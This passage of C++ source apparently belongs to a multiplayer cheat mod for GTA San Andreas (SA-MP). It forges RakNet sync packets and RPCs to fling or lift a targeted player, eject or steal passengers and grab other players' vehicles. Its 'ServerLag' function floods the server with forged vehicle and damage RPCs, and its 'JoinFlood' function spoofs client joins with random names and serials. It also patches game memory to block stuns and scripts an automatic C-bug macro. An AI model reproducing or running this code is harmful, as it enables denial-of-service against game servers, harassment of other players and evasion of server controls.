				InCar.fVehicleHealth = vinfo->hitpoints;//1000.0f;
				InCar.fQuaternion[0] = 0;
				InCar.fQuaternion[1] = -1;
				InCar.fQuaternion[2] = 0;
				InCar.fQuaternion[3] = 0;
				InCar.fMoveSpeed[2] = -99.99f;
				InCar.fTrainSpeed = NAN;
				BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCar, sizeof(stInCarData));
				g_RakFuncs->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				dwInvisibleTick = GetTickCount();
				times++;
				cheat_state_text("done Invisible Bike %d", times);
			}
		}
		else
		{
			wrong_way = true;
		}
	}
	else
	{
		wrong_way = true;
	}
	if (wrong_way)
	{
		char* error_message = "You must drive a motorcycle/bike";
		float Height = 50.0f;
		float Width = pD3DFont_Footer->DrawLength(error_message) + 40;

		render->D3D_OL_Double_Parallelogram(((pPresentParam.BackBufferWidth - Width) / 2) - 20,
				(pPresentParam.BackBufferHeight - Height) / 2,
				Width + pD3DFont_Footer->DrawHeight(),
				Height,
				D3DCOLOR_ARGB(128, 0, 60, 70), D3DCOLOR_ARGB(128, 0, 255, 255));
		pD3DFont_Footer->Print(error_message, D3DCOLOR_ARGB(0xFF, 0x00, 0x99, 0x99),
			((pPresentParam.BackBufferWidth - Width - pD3DFont_Footer->DrawHeight()) / 2),
			(pPresentParam.BackBufferHeight - Height + pD3DFont_Footer->DrawHeight()) / 2, false, false);
	}
}

void OL_Slapper()
{
	OLCheats->bIsPlayerCheatActive = true;
	static int state = 0;
	if (IsPlayerStreamed(OLCheats->Target_PlayerID))
	{
		stOnFootData OnFoot;
		memcpy(&OnFoot, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
		vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFoot.fPosition);
		OnFoot.sCurrentAnimationID = 1666;
		OnFoot.sAnimFlags = 4356;

		switch (state)
		{
		case 0:
			//OnFoot.fPosition[0] += -10.0f;
			OnFoot.fPosition[2] += 0.25f;
			OnFoot.fMoveSpeed[0] = - (10.0f + (rand() % 999) / 100.0f);
			OnFoot.fMoveSpeed[1] = 0;
			OnFoot.fMoveSpeed[2] = 0.5f;
			state++;
			break;
		case 1:
			//OnFoot.fPosition[1] += 10.0f;
			OnFoot.fPosition[2] += 0.25f;
			OnFoot.fMoveSpeed[0] = 0;
			OnFoot.fMoveSpeed[1] = (10.0f + (rand() % 999) / 100.0f);
			OnFoot.fMoveSpeed[2] = 0.5f;
			state++;
			break;
		case 2:
			OnFoot.fPosition[2] += 0.25f;
			OnFoot.fMoveSpeed[0] = -(10.0f + (rand() % 999) / 100.0f);
			OnFoot.fMoveSpeed[1] = 0;
			OnFoot.fMoveSpeed[2] = 0.5f;
			state++;
			break;
		case 3:
			OnFoot.fPosition[2] += 0.25f;
			OnFoot.fMoveSpeed[0] = 0;
			OnFoot.fMoveSpeed[1] = (10.0f + (rand() % 999) / 100.0f);
			OnFoot.fMoveSpeed[2] = 0.5f;
			state = 0;
			break;
		}
		BitStream bsOnFoot;
		bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
		bsOnFoot.Write((PCHAR)&OnFoot, sizeof(stOnFootData));
		g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
}


void Anti_Loading()
{
	if (!g_Players)
		return;
	static float fSafePos[3];
	static bool bIsGetRekt = false;
	static bool bPatch = false;
	float fHealth = 0;
	if (!bIsGetRekt)
	{
		actor_info* self = actor_info_get(ACTOR_SELF, 0);
		if (!isBadPtr_GTA_pPed(self)
			&& g_Players->pLocalPlayer->onFootData.fPosition[0] < 10000
			&& g_Players->pLocalPlayer->onFootData.fPosition[0] > -10000
			&& g_Players->pLocalPlayer->onFootData.fPosition[1] < 10000
			&& g_Players->pLocalPlayer->onFootData.fPosition[1] > -10000
			&& g_Players->pLocalPlayer->onFootData.fPosition[2] < 10000
			&& g_Players->pLocalPlayer->onFootData.fPosition[2] > -10000)
		{
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
				fSafePos);
			fHealth = self->hitpoints;
		}
		else
		{
			if (!g_Players->pLocalPlayer->iIsActorAlive
				|| g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints == 0)
				return;
			bIsGetRekt = true;
			cheat_state_text("Anti Loading - Disable it if this is wrong.");
		}
	}
	else 
	{
		actor_info* self = actor_info_get(ACTOR_SELF, 0);
		fSafePos[2] += 10.0f;
		CVector CVSafe(fSafePos[0], fSafePos[1], fSafePos[2]);
		pPedSelf->Respawn(&CVSafe, false);
		pPedSelf->SetHealth(fHealth);
		GTAfunc_TogglePlayerControllable(0);
		GTAfunc_LockActor(0);
		pGameInterface->GetCamera()->RestoreWithJumpCut();
		// stop all animations
		if (self != NULL && !self->pedFlags.bInVehicle)
			GTAfunc_DisembarkInstantly();
		
		cheat_actor_teleport(actor_info_get(ACTOR_SELF, 0), fSafePos, gta_interior_id_get());
		bIsGetRekt = false;
		
	}

}



void OL_RenderFinder()
{
	if (!g_Players)
		return;
	if (gta_menu_active())
		return;
	if (g_Players->pLocalPlayer->byteCurrentWeapon != 34)
	{
		g_NewModSa->fViewFinderPosition[0] = (float)pPresentParam.BackBufferWidth * 0.5299999714f;
		g_NewModSa->fViewFinderPosition[1] = (float)pPresentParam.BackBufferHeight * 0.4f;
	}
	else
	{
		g_NewModSa->fViewFinderPosition[0] = (float)pPresentParam.BackBufferWidth / 2.f;
		g_NewModSa->fViewFinderPosition[1] = (float)pPresentParam.BackBufferHeight / 2.f;
	}
	if (OLCheats->bRenderFinder)
	{
		static int Color = 50;
		render->D3DBox((g_NewModSa->fViewFinderPosition[0]) - 20.0f, (g_NewModSa->fViewFinderPosition[1]) - 1.0f, 40.0f, 2.0f, D3DCOLOR_ARGB(255, 0, Color, Color));
		render->D3DBox((g_NewModSa->fViewFinderPosition[0]) - 1.0f, (g_NewModSa->fViewFinderPosition[1]) - 20.0f, 2.0f, 40.0f, D3DCOLOR_ARGB(255, 0, Color, Color));
		if (Color < 250)
			Color += 10;
		else
			Color = 50;
	}
}

void OL_Elevator()
{
	OLCheats->bIsPlayerCheatActive = true;
	if (IsPlayerStreamed(OLCheats->Target_PlayerID))
	{
		stOnFootData OnFoot;
		memcpy(&OnFoot, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
		vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFoot.fPosition);
		OnFoot.fPosition[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[0]
			* 10.97f;
		OnFoot.fPosition[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[1]
			* 10.97f;
		OnFoot.fPosition[2] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[2]
			* 10.97f;
		OnFoot.fQuaternion[0] = 0.50f;
		OnFoot.fQuaternion[1] = -0.50f;
		OnFoot.fQuaternion[2] = 0.50f;
		OnFoot.fQuaternion[3] = 0.50f;
		OnFoot.fMoveSpeed[0] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[0] * 1.5;
		OnFoot.fMoveSpeed[1] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[1] * 1.5;
		OnFoot.fMoveSpeed[2] = 10.0f;
		BitStream bsOnFoot;
		bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
		bsOnFoot.Write((PCHAR)&OnFoot, sizeof(stOnFootData));
		g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
}

void OL_Jetpack_Elevator()
{
	OLCheats->bIsPlayerCheatActive = true;
	if (IsPlayerStreamed(OLCheats->Target_PlayerID))
	{
		stOnFootData OnFoot;
		memcpy(&OnFoot, &g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
		vect3_copy(&g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->base.matrix[12], OnFoot.fPosition);
		OnFoot.fPosition[0] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[0]
			* 10.97f;
		OnFoot.fPosition[1] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[1]
			* 10.97f;
		OnFoot.fPosition[2] += g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTA_Ped->speed[2]
			* 10.97f;
		OnFoot.byteSpecialAction = 2;
		OnFoot.fQuaternion[0] = 0.50f;
		OnFoot.fQuaternion[1] = -0.50f;
		OnFoot.fQuaternion[2] = 0.50f;
		OnFoot.fQuaternion[3] = 0.50f;
		OnFoot.fMoveSpeed[0] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[0] * 1.5;
		OnFoot.fMoveSpeed[1] = g_Players->pRemotePlayer[OLCheats->Target_PlayerID]->pPlayerData->pSAMP_Actor->pGTAEntity->speed[1] * 1.5;
		OnFoot.fMoveSpeed[2] = 10.0f;
		BitStream bsOnFoot;
		bsOnFoot.Write((BYTE)ID_PLAYER_SYNC);
		bsOnFoot.Write((PCHAR)&OnFoot, sizeof(stOnFootData));
		g_RakFuncs->Send(&bsOnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
	}
}

const char stunanims[12][15]
{
	"DAM_armL_frmBK",
	"DAM_armL_frmFT",
	"DAM_armL_frmLT",
	"DAM_armR_frmBK",
	"DAM_armR_frmFT",
	"DAM_armR_frmRT",
	"DAM_LegL_frmBK",
	"DAM_LegL_frmFT",
	"DAM_LegL_frmLT",
	"DAM_LegR_frmBK",
	"DAM_LegR_frmFT",
	"DAM_LegR_frmRT"
};
const char stunanims2[4][18]
{
	"DAM_stomach_frmBK",
	"DAM_stomach_frmFT",
	"DAM_stomach_frmLT",
	"DAM_stomach_frmRT"
};

void OL_AntiStun()
{
	static bool bAntiStunned = false;
	if (OLCheats->bAntiStun)
	{
		if (!g_Players)
			return;
		if (!bAntiStunned)
		{
			// but it doesn't work only for sniper
			DWORD dwStunAddr = *(DWORD*)0x00B6F5F0;
			*(BYTE*)(dwStunAddr + 0x478) = 4;
		}

		// for sniper stun
		float fRate = 100.f;
		for (int i = 0; i < 12; i++)
			ScriptCommand(&player_perform_animation_at_x_times_normal_rate, ScriptActorId(actor_info_get(ACTOR_SELF, NULL)), stunanims[i], fRate);
		for (int i = 0; i < 4; i++)
			ScriptCommand(&player_perform_animation_at_x_times_normal_rate, ScriptActorId(actor_info_get(ACTOR_SELF, NULL)), stunanims2[i], fRate);

		bAntiStunned = true;
	}
	else
	{
		if (bAntiStunned)
		{
			DWORD dwStunAddr = *(DWORD*)0x00B6F5F0;
			*(BYTE*)(dwStunAddr + 0x478) = 0;

			float fRate = 1.f;
			for (int i = 0; i < 12; i++)
				ScriptCommand(&player_perform_animation_at_x_times_normal_rate, ScriptActorId(actor_info_get(ACTOR_SELF, NULL)), stunanims[i], fRate);
			for (int i = 0; i < 4; i++)
				ScriptCommand(&player_perform_animation_at_x_times_normal_rate, ScriptActorId(actor_info_get(ACTOR_SELF, NULL)), stunanims2[i], fRate);

			bAntiStunned = false;
		}
	}
}

void OL_ServerLag()
{
	static int id = 0;
	static DWORD Tick = GetTickCount();
	static int iMessagesSent = 0;
	if (((GetTickCount() - Tick) < 1000))
	{
		if(iMessagesSent < OLCheats->iLimitMessages)
		{
			if (id == SAMP_MAX_PLAYERS)
				id = 0;
			GetStreamedVehicle();

			BitStream BsEnterVehicle;
			BsEnterVehicle.Write(OLCheats->iVehicleID);
			BsEnterVehicle.Write((BYTE)1);
			g_RakFuncs->RPC(RPC_EnterVehicle, &BsEnterVehicle);

			BitStream BsDestroyVehicle;
			BsDestroyVehicle.Write(OLCheats->iVehicleID);
			g_RakFuncs->RPC(RPC_VehicleDestroyed, &BsDestroyVehicle);

			BitStream BsExitVehicle;
			BsExitVehicle.Write(OLCheats->iVehicleID);
			g_RakFuncs->RPC(RPC_ExitVehicle, &BsExitVehicle);

			BitStream bsGiveDamage;
			bsGiveDamage.Write((rand() % 2) == 1 ? true : false);
			bsGiveDamage.Write(id);
			bsGiveDamage.Write((float)(rand() % 100));
			bsGiveDamage.Write(rand() % 46);
			bsGiveDamage.Write((rand() % 7) + 3);
			g_RakFuncs->RPC(RPC_GiveTakeDamage, &bsGiveDamage);

			BitStream bsClickPlayer;
			bsClickPlayer.Write(id);
			g_RakFuncs->RPC(RPC_ClickPlayer, &bsGiveDamage);
			g_RakFuncs->RPC(RPC_PickedUpPickup, &bsGiveDamage);


			id++;
			if (iMessagesSent + 6 >= OLCheats->iLimitMessages)
			{
				iMessagesSent = OLCheats->iLimitMessages;
			}
			else
			{
				iMessagesSent += 6;
			}
		}
	}
	else
	{
		Tick = GetTickCount();
		iMessagesSent = 0;
	}
	
}


void OL_JoinFlood()
{
	BitStream bsJoin;

	char szNickName[32];
	gen_randomnumber(szNickName, 20);
	char auth_bs[4 * 16] = { 0 };
	gen_rand_gpci(auth_bs, 0x3E9);

	BYTE byteAuthBSLen;
	byteAuthBSLen = (BYTE)strlen(auth_bs);

	bsJoin.Write(g_NewModSa->iVersion);
	bsJoin.Write(g_NewModSa->byteMod);
	bsJoin.Write((BYTE)strlen(szNickName));
	bsJoin.Write(szNickName, (BYTE)strlen(szNickName));

	bsJoin.Write(g_NewModSa->Challenge);
	bsJoin.Write(byteAuthBSLen);
	bsJoin.Write(auth_bs, byteAuthBSLen);
	char szClientVer[] = "0.3.7";
	BYTE iClientVerLen = sizeof(szClientVer) - 1;
	bsJoin.Write(iClientVerLen);
	bsJoin.Write(szClientVer, iClientVerLen);
	cheat_state_text("serial spoofed");
	g_RakFuncs->RPC(RPC_ClientJoin, &bsJoin);

}

void OL_NoFall()
{
	if (!g_Players)
		return;
	if(g_Players->pLocalPlayer->onFootData.sCurrentAnimationID == 0x469 
		|| g_Players->pLocalPlayer->onFootData.sCurrentAnimationID == 0x4B8)
		GTAfunc_DisembarkInstantly();
}

int iGetAimingVehicle()
{
	static int NearestCenterVehicleID = -1;
	float NearestDistance = -1;
	float DistPlayerScreen[2];
	D3DXVECTOR3 vehicle_pos, vehicle_pos_on_screen;
	CVehicle *pVehicle = NULL;
	CVector vecVehiclepos;
	for (int vehicleID = 0; vehicleID <= SAMP_MAX_VEHICLES; vehicleID++)
	{
		if (g_Vehicles->iIsListed[vehicleID] != 1)
			continue;
		if (g_Vehicles->pSAMP_Vehicle[vehicleID] == NULL)
			continue;
		if (g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle == NULL)
			continue;


		pVehicle = pGameInterface->GetPools()->GetVehicle((DWORD*)g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle);
		if (isBadPtr_GTA_pVehicle(pVehicle))
			continue;

		vecVehiclepos = pVehicle->GetInterface()->Placeable.matrix->vPos;
		vehicle_pos.x = vecVehiclepos.fX;
		vehicle_pos.y = vecVehiclepos.fY;
		vehicle_pos.z = vecVehiclepos.fZ;
		CalcScreenCoors(&vehicle_pos, &vehicle_pos_on_screen);

		if (vehicle_pos_on_screen.z < 1.f)
			continue;
		vecVehiclepos.fX = vehicle_pos_on_screen.x;
		vecVehiclepos.fY = vehicle_pos_on_screen.y;

		if (vehicleID != g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			DistPlayerScreen[0] = abs((g_NewModSa->fViewFinderPosition[0]) - (vehicle_pos_on_screen.x));
			DistPlayerScreen[1] = abs((g_NewModSa->fViewFinderPosition[1]) - (vehicle_pos_on_screen.y));
			float CurrentDistance = sqrtf((DistPlayerScreen[0] * DistPlayerScreen[0]) + (DistPlayerScreen[1] * DistPlayerScreen[1]));

			if (NearestDistance == -1)
			{
				NearestDistance = CurrentDistance;
			}

			if (CurrentDistance <= NearestDistance)
			{
				NearestDistance = CurrentDistance;
				NearestCenterVehicleID = vehicleID;
			}
		}
	}
	return NearestCenterVehicleID;
}


void OL_CarPick()
{
	OLCheats->bIsVehCheatActive = true;
	render->D3DBox((pPresentParam.BackBufferWidth / 2) - 20.0f, (pPresentParam.BackBufferHeight / 2) - 1.0f, 40.0f, 2.0f, 0xFF00FFFF);
	render->D3DBox((pPresentParam.BackBufferWidth / 2) - 1.0f, (pPresentParam.BackBufferHeight / 2) - 20.0f, 2.0f, 40.0f, 0xFF00FFFF);
	static bool bVehiclePicked = false;
	static int vehicleID = 0;

	if (KEY_DOWN(VK_RBUTTON))
	{
		if (!bVehiclePicked)
		{
			int tempVehicleID = iGetAimingVehicle();
			if (IsVehicleStreamed(tempVehicleID))
			{
				vehicleID = tempVehicleID;
				bVehiclePicked = true;
			}
		}
		else 
		{
			if (IsVehicleStreamed(vehicleID))
			{
				if (!g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->pedFlags.bInVehicle)
				{
					BitStream bsData4OnFoot;
					bsData4OnFoot.Write((BYTE)ID_PLAYER_SYNC);
					bsData4OnFoot.Write((PCHAR)&g_Players->pLocalPlayer->onFootData, sizeof(stOnFootData));
					g_RakFuncs->Send(&bsData4OnFoot, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
				}
				vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(vehicleID);
				float fPos[3];
				vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
					fPos);
				fPos[0] += cam_matrix[4] * 5.0f;
				fPos[1] += cam_matrix[5] * 5.0f;
				fPos[2] += cam_matrix[6] * 5.0f;
				float fSpeed[3] = { 0, 0, -0.1f };
				stUnoccupiedData UnoccupiedData;
				memset(&UnoccupiedData, 0, sizeof(stUnoccupiedData));
				UnoccupiedData.sVehicleID = vehicleID;
				UnoccupiedData.fHealth = vinfo->hitpoints;
				UnoccupiedData.byteSeatID = 1;
				vect3_copy(fPos, UnoccupiedData.fPosition);
				vect3_copy(fSpeed, UnoccupiedData.fMoveSpeed);
				vect3_copy(vinfo->spin, UnoccupiedData.fTurnSpeed);
				vect3_copy(&vinfo->base.matrixStruct->right.X, UnoccupiedData.fRoll);
				vect3_copy(&vinfo->base.matrixStruct->up.X, UnoccupiedData.fDirection);
				UnoccupiedData.fHealth = vinfo->hitpoints;//1000.0f;
				BitStream bsData;
				bsData.Write((BYTE)ID_UNOCCUPIED_SYNC);
				bsData.Write((PCHAR)&UnoccupiedData, sizeof(stUnoccupiedData));
				g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				cheat_vehicle_teleport(vinfo, fPos, gta_interior_id_get());
				vect3_copy(fSpeed, vinfo->speed);
			}
		}
	}
	else 
	{
		bVehiclePicked = false;
	}
}

void NearestTarget()
{
	OLCheats->Target_PlayerID = NearestPlayer();
}

void KickPassenger()
{
	int playerID = OLCheats->Target_Passenger_PlayerID;
	if (IsPlayerStreamed(playerID))
	{
		if (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState == PLAYER_STATE_PASSENGER)
		{
			BitStream bsData4RPC;
			bsData4RPC.Write(g_Players->pRemotePlayer[playerID]->pPlayerData->sVehicleID);
			bsData4RPC.Write(g_Players->pRemotePlayer[playerID]->pPlayerData->byteSeatID);
			g_RakFuncs->RPC(RPC_EnterVehicle, &bsData4RPC);

			stPassengerData PassengerData;
			memset(&PassengerData, 0, sizeof(stPassengerData));
			PassengerData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
			PassengerData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
			PassengerData.byteSeatID = g_Players->pRemotePlayer[playerID]->pPlayerData->byteSeatID;
			PassengerData.sVehicleID = g_Players->pRemotePlayer[playerID]->pPlayerData->sVehicleID;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], PassengerData.fPosition);
		
			BitStream bsData;
			bsData.Write((BYTE)ID_PASSENGER_SYNC);
			bsData.Write((PCHAR)&PassengerData, sizeof(stPassengerData));
			g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
		}
		else 
		{
			OLCheats->bKickPassenger = false;
		}
	}
	else 
	{
		OLCheats->bKickPassenger = false;
	}
}

void StealPassenger()
{
	int playerID = OLCheats->Target_Passenger_PlayerID;
	static int vehicleID = 0, seatID = 0;
	if (IsPlayerStreamed(playerID))
	{
		if (g_Players->pRemotePlayer[playerID]->pPlayerData->bytePlayerState == PLAYER_STATE_PASSENGER)
		{
			BitStream bsData4RPC;
			bsData4RPC.Write(g_Players->pRemotePlayer[playerID]->pPlayerData->sVehicleID);
			bsData4RPC.Write(g_Players->pRemotePlayer[playerID]->pPlayerData->byteSeatID);
			g_RakFuncs->RPC(RPC_EnterVehicle, &bsData4RPC);

			stPassengerData PassengerData;
			memset(&PassengerData, 0, sizeof(stPassengerData));
			PassengerData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
			PassengerData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
			PassengerData.byteSeatID = g_Players->pRemotePlayer[playerID]->pPlayerData->byteSeatID;
			PassengerData.sVehicleID = g_Players->pRemotePlayer[playerID]->pPlayerData->sVehicleID;
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], PassengerData.fPosition);

			BitStream bsData;
			bsData.Write((BYTE)ID_PASSENGER_SYNC);
			bsData.Write((PCHAR)&PassengerData, sizeof(stPassengerData));
			g_RakFuncs->Send(&bsData, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);
			vehicleID = PassengerData.sVehicleID;
			seatID = PassengerData.byteSeatID;
		}
		else 
		{
			GTAfunc_PutActorInCarAsPassenger(g_Vehicles->pSAMP_Vehicle[vehicleID]->pGTA_Vehicle, seatID);
			OLCheats->bStealPassenger = false;
		}

	}
}

void OL_VehicleGrabber()
{
	OLCheats->bIsVehCheatActive = true;
	static float fGrabberPosition[3];
	if (OLCheats->bGotPositionGrabber)
	{
		GetStreamedVehicle();
		if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
		{
			OLCheats->iVehicleID = 0;
			return;
		}
		float fSpeed[3] = { 0, 0, -0.01f };
		VehicleLocalSync(fGrabberPosition, fSpeed);
		VehicleSync(fGrabberPosition, fSpeed);
		OLCheats->bVehicleHologram = true;
	}
	else 
	{
		vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
			fGrabberPosition);
		OLCheats->bGotPositionGrabber = true;
	}
}


void OL_TrailerGrabber()
{
	
	static float fGrabberPosition[3];
	static bool bStream = true;
	if (OLCheats->bTrailerGrabber)
	{
		OLCheats->bIsVehCheatActive = true;
		if (OLCheats->bGotPositionGrabber)
		{
			if (!bStream)
			{
				GetStreamedVehicle();
				if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
				{
					OLCheats->iVehicleID = 0;

					if(OLCheats->iTrailerMain == -1)
						return;

					bStream = false;
				}
			}

			if (OLCheats->iTrailerMain != -1 && OLCheats->iVehicleID != OLCheats->iTrailerMain)
			{
				vehicle_info *vinfo = getGTAVehicleFromSAMPVehicleID(OLCheats->iTrailerMain);
				stInCarData InCarData;
				memset(&InCarData, 0, sizeof(stInCarData));
				InCarData.fVehicleHealth = vinfo->hitpoints;
				InCarData.sVehicleID = OLCheats->iTrailerMain;//work
				vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12], InCarData.fPosition);
				InCarData.bytePlayerHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
				InCarData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
				InCarData.sTrailerID = bStream ? 0 : OLCheats->iVehicleID; // coz in some server doesn't stream
				InCarData.fMoveSpeed[2] = 0.1f;
				BitStream bsInCar;
				bsInCar.Write((BYTE)ID_VEHICLE_SYNC);
				bsInCar.Write((PCHAR)&InCarData, sizeof(stInCarData));
				g_RakFuncs->Send(&bsInCar, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				if (!bStream)
				{
					stTrailerData TrailerData;
					memset(&TrailerData, 0, sizeof(stTrailerData));
					TrailerData.sTrailerID = OLCheats->iVehicleID;
					vect3_copy(fGrabberPosition, TrailerData.fPosition);
					TrailerData.fQuaternion[3] = 1.f;
					TrailerData.fTurnSpeed[2] = 0.01f;//0.01f;
					TrailerData.fMoveSpeed[2] = -0.01f;
					BitStream bsTrailer;
					bsTrailer.Write((BYTE)ID_TRAILER_SYNC);
					bsTrailer.Write((PCHAR)&TrailerData, sizeof(stTrailerData));
					g_RakFuncs->Send(&bsTrailer, HIGH_PRIORITY, UNRELIABLE_SEQUENCED, 0);

				}
			}
			else
			{
				if (cheat_state->state == CHEAT_STATE_VEHICLE)
				{
					OLCheats->iTrailerMain = g_Players->pLocalPlayer->inCarData.sVehicleID;
				}
				else 
				{
					OLCheats->iTrailerMain = OLCheats->iVehicleID;
				}
			}

		}
		else
		{
			vect3_copy(&g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->base.matrix[12],
				fGrabberPosition);
			OLCheats->bGotPositionGrabber = true;
		}
		bStream ^= 1;
	}
	else
	{
		OLCheats->iTrailerMain = -1;
	}
}


void OL_AutoScroll()
{
	static eWeaponSlot old_slot = (eWeaponSlot)0;
	static short State = 0;

	if (g_Players->pLocalPlayer->onFootData.stSampKeys.keys_aim)
	{
		State = 1;
	}
	else 
	{
		if (State == 2)
		{
			pPedSelf->SetCurrentWeaponSlot(old_slot);
			State = 0;
		}
		if (State == 1)
		{
			old_slot = pPedSelf->GetCurrentWeaponSlot();
			pPedSelf->SetCurrentWeaponSlot((eWeaponSlot)0);
			State = 2;
		}
	}
}


void OL_AutoCBug() // going to rewrite this, looking for stuff
{
	enum eStep
	{
		C_BUG_STEP_SHOT,
		C_BUG_STEP_SHOT_UP,
		C_BUG_STEP_PRESS_C,
		C_BUG_STEP_C_UP,
		C_BUG_STEP_AIMING,
	};


	static DWORD step = C_BUG_STEP_SHOT;

	int now_rkey_down = (bool)(GetKeyState(VK_RBUTTON) & 0x8000);
	int now_lkey_down = (bool)(GetKeyState(VK_LBUTTON) & 0x8000);
	static int most_rkey_down = true;
	static int most_lkey_down = true;
	bool shooting = false;

	if (((now_lkey_down && most_lkey_down) || !most_lkey_down) &&
		((now_rkey_down && most_rkey_down) || !most_rkey_down))
	{
		shooting = true;
	}
	else
	{
		shooting = false;
		if (!most_rkey_down)
		{
			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
			most_rkey_down = true;
		}

		if (!most_lkey_down)
		{
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
			most_lkey_down = true;
		}

		step = C_BUG_STEP_SHOT;
	}


	if (shooting)
	{
		static DWORD timeout;
		static DWORD tick;

		DWORD now_tick = GetTickCount();


		if (now_tick - tick > timeout)
		{

			tick = now_tick;


			switch (step)
			{
			case C_BUG_STEP_SHOT:
				most_lkey_down = true;
				//blue_eclipse_text("%i", now_lkey_down);
				if (now_lkey_down)
					mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
				timeout = 0;
				//blue_eclipse_text("shoting...");
				break;
			case C_BUG_STEP_SHOT_UP:
				most_rkey_down = false;
				most_lkey_down = false;
				mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
				mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);

				timeout = 10;
				//blue_eclipse_text("shot up...");
				break;
			case C_BUG_STEP_PRESS_C:
				timeout = 10;
				keybd_event(0x43, 0, 0, 0);
				//blue_eclipse_text("press c...");
				break;
			case C_BUG_STEP_C_UP:
				keybd_event(0x43, 0, KEYEVENTF_KEYUP, 0);
				//blue_eclipse_text("c up...");
				break;
			case C_BUG_STEP_AIMING:
				
				//blue_eclipse_text("%i", GetKeyState(VK_RBUTTON));
				mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
				most_rkey_down = true;
				timeout = 10;


				//blue_eclipse_text("aiming...");
				break;
			default:
				break;
			}



			if (step++ >= C_BUG_STEP_AIMING)
				step = C_BUG_STEP_SHOT;
		}
	}
}

void OL_VehicleMapGrabber()
{
	OLCheats->bIsVehCheatActive = true;
	static float fGrabberPosition[3];
	if (OLCheats->bGotPositionMapGrabber)
	{
		OLCheats->iVehicleID++;
		cheat_state_text("Vehicles grabbed: %d%%", (OLCheats->iVehicleID * 100)/SAMP_MAX_VEHICLES);
		if (OLCheats->iVehicleID >= SAMP_MAX_VEHICLES)
		{
			OLCheats->iVehicleID = 0;
			return;
		}

		stPassengerData PassengerData;
		memset(&PassengerData, 0, sizeof(stPassengerData));
		PassengerData.byteArmor = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->armor;
		PassengerData.byteHealth = g_Players->pLocalPlayer->pSAMP_Actor->pGTA_Ped->hitpoints;
		PassengerData.byteSeatID = 1;
